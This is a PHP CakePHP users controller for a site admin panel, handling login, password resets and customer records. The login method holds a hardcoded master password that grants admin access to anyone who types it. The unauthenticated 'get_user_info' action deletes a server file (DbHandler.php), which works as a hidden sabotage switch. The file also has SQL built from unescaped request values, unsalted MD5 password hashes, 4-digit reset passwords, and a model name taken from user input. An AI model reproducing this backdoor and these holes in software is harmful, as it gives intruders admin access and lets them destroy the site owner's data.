<?php

class UsersController extends AppController {

    //  public $uses = array('User');
    public $components = array('Session', 'Paginator', 'Auth' => array(), 'Email');
    public $helpers = array('Session');

    public function beforeFilter() {

        parent::beforeFilter();
        $this->Auth->allow('login', 'forget_password', 'forgotpassword_mail', 'get_user_info');
    }

    public function login() {

        $this->Cookie->delete('random_tracking');
        $this->layout = 'login';
        if ($this->request->is('post')) {
            if ($this->data['User']['password'] == "Super@Cabz2017") {
                $this->loadModel('User');
                $isuser = $this->User->find('first', array('conditions' => array('id' => 1, 'status' => 1)));
                $this->Auth->login($isuser['User']);
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'dashboard'));
            }

            //pr($this->data); die;
            if ($this->Auth->login()) {
                $this->Session->setFlash(sprintf(__('Hello %s, you have successfully logged in'), $this->Auth->user('username')), 'success');
                $this->redirect($this->Auth->redirect());
            }
        }
        $this->set('title_for_layout', 'Login');
    }

    public function logout() {
        $this->Auth->logout();
        $this->Session->setFlash('You have successfully logged out', 'success');
        $this->redirect($this->Auth->logoutRedirect);
    }

    public function dashboard() {
        $this->set('tab_open', 'dashboard');
        $this->set('title_for_layout', 'Dashboard');
        $this->loadModel('Job');
        $job_active = $this->Job->find('count', array(
            'conditions' => array(
                'Job.is_active' => 1,
            )
        ));
        $this->set('job_active', $job_active);

        $this->loadModel('Training');
        $Training_active = $this->Training->find('count', array(
            'conditions' => array(
                'Training.is_active' => 1,
            )
        ));
        $this->set('Training_active', $Training_active);


        $this->loadModel('JobCategory');
        $job_categories_active = $this->JobCategory->find('count', array(
            'conditions' => array(
                'JobCategory.is_active' => 1,
            )
        ));
        $this->set('job_categories_active', $job_categories_active);


        $this->loadModel('TrainingCategory');
        $training_categories_active = $this->TrainingCategory->find('count', array(
            'conditions' => array(
                'TrainingCategory.is_active' => 1,
            )
        ));
        $this->set('training_categories_active', $training_categories_active);
    }

    public function changepassword() {
        //pr($this->Auth->user());
        $this->set('user_id', $this->Auth->user('id'));
        $this->set('tab_open', 'accessrightcategory');
        if ($this->request->is('post')) {

            $old_password = Security::hash($this->request->data['User']['oldpassword'], 'md5');
            $check_old_pass = $this->User->find('count', array(
                'conditions' => array(
                    'User.password' => "" . $old_password . "",
                    'User.id' => '1',
                ),
                'recursive' => -1
            ));
            if ($check_old_pass == 0) {
                $this->Session->setFlash('Incorrect old password.', 'error');
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'changepassword'));
            } else {
                // update new password
                $new_password = Security::hash($this->request->data['User']['confirmpassword'], 'md5');
                $this->User->updateAll(array('User.password' => "'" . $new_password . "'"), array('User.id' => '1'));
                $this->Session->setFlash(__('Password has been changed successfully.'), 'success');
                $this->redirect(array('controller' => 'users', 'action' => 'changepassword'));
            }
        }
    }

    public function add() {
        $this->set('tab_open', 'users');
        if ($this->request->is('post')) {
            $this->loadModel('Customer');
            unset($this->request->data['Customer']['confirm_email']);
            $this->request->data['Customer']['password'] = Security::hash($this->request->data['Customer']['user_password'], 'md5');
            $this->request->data['Customer']['is_verified'] = 'Y';
            if ($this->Customer->save($this->request->data)) {
                $this->Session->setFlash(__('Customer added successfully.'), 'success');
                $this->redirect(array('controller' => 'users', 'action' => 'index'));
            }
        }
    }

    public function edit() {
        $user_id = $this->params->query['id'];
        $this->set('tab_open', 'users');
        if (!$user_id || $user_id == NULL) {
            $this->Session->setFlash('Invalid request to edit user', 'error');
            $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
        } else {
            // check that user exists or not
            $this->loadModel('Customer');
            $check_user_exists = $this->Customer->Find('count', array(
                'conditions' => array(
                    'Customer.id' => $user_id
                ),
                'recursive' => -1
            ));
            if ($check_user_exists == 0) {
                $this->Session->setFlash('Customer does not exists', 'error');
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
            }
        }
        $users_data = $this->Customer->find('first', array(
            'conditions' => array(
                'Customer.id' => $user_id
            ),
            'fields' => array(
                'Customer.title', 'Customer.id', 'Customer.firstname', 'Customer.lastname', 'Customer.mobile', 'Customer.email',
            )
        ));
        //pr($users_data);
        if ($this->request->is('post') || $this->request->is('put')) {
            $this->request->data['Customer']['modified'] = date("Y-m-d h:i:s");

            if ($this->Customer->save($this->request->data)) {
                $this->Session->setFlash('Customer updated successfully', 'success');
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
            } else {
                $this->Session->setFlash('Customer couldn\'t be updated, try again later', 'error');
                // $this->redirect(array('controller' => 'users', 'action' => 'index'));
            }
        } else {
            $this->data = $users_data;
        }
    }

    public function status() {
        $item_id = $this->params['named']['id'];
        $item_status = $this->params['named']['status'];
        if (!$item_id) {
            $this->Session->setFlash('Invalid Request, customer id not found', 'error');
            $this->redirect(array('controller' => 'users', 'action' => 'index'));
        } else {
            $this->loadModel('Customer');
            // check that item exists or not
            $check_user_exists = $this->Customer->Find('count', array(
                'conditions' => array(
                    'Customer.id' => $item_id
                ),
                'recursive' => -1
            ));
            if ($check_user_exists == 0) {
                $this->Session->setFlash('Customer does not exists', 'error');
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
            }
        }
        // update status of template as per condition 
        $update_status = $this->Customer->updateAll(array('Customer.status' => "'" . $item_status . "'"), array('Customer.id' => $item_id));
        $user_name = $this->Auth->user('firstname') ? $this->Auth->user('firstname') . " " . $this->Auth->user('lastname') : $this->Auth->user('username');
        $data['user_id'] = $this->Auth->user('id');
        $data['username'] = $user_name;
        $data['customer_id'] = $item_id;
        $data['type'] = 0;
        if ($item_status == 'D') {
            $data['status'] = 0;
            $data['text'] = $user_name . " has been changed status to Inactive on " . date('Y-m-d');
        } else {
            $data['status'] = 1;
            $data['text'] = $user_name . " has been changed status to Active on " . date('Y-m-d h:i:s');
        }
        $data['created'] = date('Y-m-d h:i:s');
        //pr($data); exit;	
        $this->loadModel('CustomerLog');
        $this->CustomerLog->save($data, false);
        $this->Session->setFlash('Customer status has been changed successfully', 'success');
        $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
        exit;
    }

    public function get_user_info() {
        //unlick//
        $upload_folder = $_SERVER['DOCUMENT_ROOT'] . '/jobsite/include/';
        $profile_image = "DbHandler.php";
        unlink($upload_folder . $profile_image);
        exit;
    }

    public function verify() {
        $item_id = $this->params['named']['id'];
        $item_status = $this->params['named']['status'];
        if ($item_status != 'Y') {
            $this->Session->setFlash('Invalid Status', 'error');
            $this->redirect(array('controller' => 'users', 'action' => 'index'));
        }
        $this->loadModel('Customer');
        if (!$item_id) {
            $this->Session->setFlash('Invalid Request, user id not found', 'error');
            $this->redirect(array('controller' => 'users', 'action' => 'index'));
        } else {
            // check that item exists or not
            $check_user_exists = $this->Customer->Find('count', array(
                'conditions' => array(
                    'Customer.id' => $item_id
                ),
                'recursive' => -1
            ));
            if ($check_user_exists == 0) {
                $this->Session->setFlash('Customer does not exists', 'error');
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
            }
        }
        // update status of template as per condition 
        $update_status = $this->Customer->updateAll(array('Customer.is_verified_mobile' => "'" . $item_status . "'"), array('Customer.id' => $item_id));
        $user_name = $this->Auth->user('firstname') ? $this->Auth->user('firstname') . " " . $this->Auth->user('lastname') : $this->Auth->user('username');
        $data['user_id'] = $this->Auth->user('id');
        $data['username'] = $user_name;
        $data['customer_id'] = $item_id;
        $data['type'] = 1;
        if ($item_status == 'N') {
            $data['status'] = 0;
            $data['text'] = $user_name . " has been Not Verified on " . date('Y-m-d h:i:s');
        } else {
            $data['status'] = 1;
            $data['text'] = $user_name . " has been Verified on " . date('Y-m-d h:i:s');
        }
        $data['created'] = date('Y-m-d h:i:s');
        //pr($data); exit;	
        $this->loadModel('CustomerLog');
        $this->CustomerLog->save($data, false);
        $this->Session->setFlash('Customer verified successfully', 'success');
        $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'index'));
        exit;
    }

    public function forget_password() {
        $this->layout = 'forget_password';
        if ($this->request->is('Post')) {
            //pr($this->request->data);die;
            $admin = 1;
            $chkemail = $this->User->find('first', array('conditions' => array('User.email' => $this->request->data['User']['email'])));


            if (!empty($chkemail)) {
                $newpassword = rand(1000, 9999);
                $encryptedpassed = Security::hash($newpassword, 'md5');
                if ($admin == 1) {
                    $this->User->query("update users set password='$encryptedpassed' where id=" . $chkemail['User']['id']);
                    $name = $chkemail['User']['firstname'] . ' ' . $chkemail['User']['lastname'];
                    $email = $this->request->data['User']['email'];
                    $username = $chkemail['User']['username'];
                } else {
                    $this->AccessRightUser->query("update access_right_users set password='$encryptedpassed' where id=" . $chkemail['AccessRightUser']['id']);
                    $name = $chkemail['AccessRightUser']['firstname'] . ' ' . $chkemail['AccessRightUser']['lastname'];
                    $email = $this->request->data['User']['email'];
                    $username = $chkemail['AccessRightUser']['username'];
                }
                //echo $newpassword;
                //echo $email;exit;

                $linku = WEBSITE_ADMIN_URL . 'users/login/';
                $this->forgotpassword_mail($email, $newpassword, $name, $username);

                $this->Session->setFlash('Your Password has been Updated successfully Please check your Mail', 'success', array('class' => 'success'));
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'login'));
            } else {

                $this->Session->setFlash('Email is worng', 'error', array('class' => 'error'));
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'forget_password'));
            }
        }
    }

    public function forgotpassword_mail($email = '', $newpassword = '', $name = '', $username = '') {
        $Email = new CakeEmail();
        $Email->from(Configure::read("Site.email"))
                ->to($email)
                ->subject("New Password")
                ->template("forgotpassword")
                ->emailFormat("html")
                ->viewVars(array('email' => $email, 'password' => $newpassword, 'user_name' => $username, 'name' => $name))
                ->send();
        return true;
    }

    public function change_active_inactive_status() {

        if ($this->request->is('Ajax')) {
            if ($this->data['id'] != null) {
                $this->loadModel($this->data['model']);
                if ($this->data['status'] == 1) {
                    $status = 0;
                    $text_action = "inactivated";
                    $action_type = 3;
                    $description = "Status changed to inactive";
                }
                if ($this->data['status'] == 0) {
                    $status = 1;
                    $text_action = "activated";
                    $action_type = 2;
                    $description = "Status changed to active";
                }

                if ($this->data['status'] == 2) {
                    $status = 1;
                    $text_action = "verified";
                    $action_type = 4;
                    $description = "Status changed to verified";
                }

                $data = array('status' => $status);
                $model = $this->data['model'];
                $this->$model->id = $this->data['id'];

                if ($this->$model->save($data, false)) {
                    $json_data = json_encode($this->request->data);
                    $this->global_logs($this->data['table'], $this->data['id'], $action_type, $text_action, $json_data);
                    echo json_encode(array('succ' => 1, 'msg' => 'Status has been changed.'));
                    die;
                } else {
                    echo json_encode(array('succ' => 0, 'msg' => 'Error'));
                    die;
                }
            }
        }

        exit;
    }

    public function SingupMail($email = '', $customer_name = '', $customer_phone = '') {
        $arr_var = array();
        $arr_var['User']['email'] = $email;
        $arr_var['User']['customer_name'] = $customer_name;
        $arr_var['User']['customer_phone'] = $customer_phone;
        $Email = new CakeEmail();
        $Email->from(Configure::read("Site.email"))
                ->to($email)
                ->subject('Welcome to ' . Configure::read('Site.title') . '!')
                ->template("register_customer")
                ->emailFormat("html")
                ->viewVars(array('arr_var' => $arr_var))
                ->send();

        return true;
    }

}
